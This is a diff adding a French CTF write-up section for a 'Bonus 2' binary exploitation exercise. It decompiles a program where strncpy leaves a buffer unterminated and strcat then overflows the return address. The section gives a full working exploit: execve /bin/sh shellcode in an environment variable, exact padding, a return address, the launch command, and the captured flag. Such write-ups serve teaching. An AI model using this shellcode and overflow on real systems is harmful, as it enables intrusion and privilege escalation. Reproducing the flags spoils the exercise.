@@ -618,3 +618,137 @@ on a plus qu'à faire ./bonus1 -2147483633 "<padding de 56> + <adresse de execl 
 
 ## flag : 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
 
+# Bonus 2
+
+```c
+undefined4 main(int param_1,int param_2)
+
+{
+  undefined4 uVar1;
+  int iVar2;
+  char *pcVar3;
+  undefined4 *puVar4;
+  byte bVar5;
+  char local_60 [40];
+  char acStack_38 [36];
+  char *local_14;
+  
+  bVar5 = 0;
+  if (param_1 == 3) {
+    pcVar3 = local_60;
+    for (iVar2 = 0x13; iVar2 != 0; iVar2 = iVar2 + -1) {
+      pcVar3[0] = '\0';
+      pcVar3[1] = '\0';
+      pcVar3[2] = '\0';
+      pcVar3[3] = '\0';
+      pcVar3 = pcVar3 + 4;
+    }
+    strncpy(local_60,*(char **)(param_2 + 4),0x28);
+    strncpy(acStack_38,*(char **)(param_2 + 8),0x20);
+    local_14 = getenv("LANG");
+    if (local_14 != (char *)0x0) {
+      iVar2 = memcmp(local_14,&DAT_0804873d,2);
+      if (iVar2 == 0) {
+        language = 1;
+      }
+      else {
+        iVar2 = memcmp(local_14,&DAT_08048740,2);
+        if (iVar2 == 0) {
+          language = 2;
+        }
+      }
+    }
+    pcVar3 = local_60;
+    puVar4 = (undefined4 *)&stack0xffffff50;
+    for (iVar2 = 0x13; iVar2 != 0; iVar2 = iVar2 + -1) {
+      *puVar4 = *(undefined4 *)pcVar3;
+      pcVar3 = pcVar3 + ((uint)bVar5 * -2 + 1) * 4;
+      puVar4 = puVar4 + (uint)bVar5 * -2 + 1;
+    }
+    uVar1 = greetuser();
+  }
+  else {
+    uVar1 = 1;
+  }
+  return uVar1;
+}
+```
+
+```c
+void greetuser(void)
+
+{
+  char local_4c [4];
+  undefined4 local_48;
+  char local_44 [64];
+  
+  if (language == 1) {
+    local_4c[0] = 'H';
+    local_4c[1] = 'y';
+    local_4c[2] = 'v';
+    local_4c[3] = -0x3d;
+    local_48._0_1_ = -0x5c;
+    local_48._1_1_ = -0x3d;
+    local_48._2_1_ = -0x5c;
+    local_48._3_1_ = ' ';
+    builtin_strncpy(local_44,"päivää ",0xb);
+  }
+  else if (language == 2) {
+    builtin_strncpy(local_4c,"Goed",4);
+    local_48._0_1_ = 'e';
+    local_48._1_1_ = 'm';
+    local_48._2_1_ = 'i';
+    local_48._3_1_ = 'd';
+    builtin_strncpy(local_44,"dag!",4);
+    local_44[4] = ' ';
+    local_44[5] = '\0';
+  }
+  else if (language == 0) {
+    builtin_strncpy(local_4c,"Hell",4);
+    local_48._0_3_ = 0x206f;
+  }
+  strcat(local_4c,&stack0x00000004);
+  puts(local_4c);
+  return;
+}
+```
+
+Dans main, on a deux copies d'arguments avec des tailles fixes :
+```c
+strncpy(local_60,*(char **)(param_2 + 4),0x28); // 0x28 = 40
+strncpy(acStack_38,*(char **)(param_2 + 8),0x20); // 0x20 = 32
+```
+
+Si on met exactement 40 caractères dans le premier argument, strncpy ne met pas de \0. (Comme l'exo d'avant)
+
+Dans greetuser, la phrase est construite selon la variable d'environnement LANG :
+```c
+strcat(local_4c,&stack0x00000004); // Notre LANG=nl
+```
+
+À cause du fait qu'y ait pas de \0, strcat va copier notre argument 1 (40 octets) et va overflow sur l'argument 2.
+La taille des buffers locaux dans greetuser fait 72 octets au total.
+Si LANG=nl : "Goedemiddag! " fait 14 caractères. (14 + 40 + 32 = 86, donc suffisant pour atteindre l'eip)
+
+En testand avec GDB, on remarque de l'EIP commence à être écrasé exactement au 24ème caractère (offset 23) de notre deuxième argument.
+
+On peut donc utiliser le même shellcode que le bonus0.
+
+
+```txt
+payload arg 1 : A * 40 (remplit le buffer sans mettre de \0)
+payload arg 2 : B * 23 (padding exact) + adresse du shellcode en mémoire
+```
+
+```sh
+# Mettre le shellcode dans l'env
+export SHELLCODE=$(python -c 'print "\x90"*1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
+
+# Trouver l'adresse
+env LANG=nl SHELLCODE=$SHELLCODE /tmp/find
+
+# Lancer l'exploit
+LANG=nl ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*23 + "\x3a\xfb\xff\xbf"')
+```
+
+# flag : 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
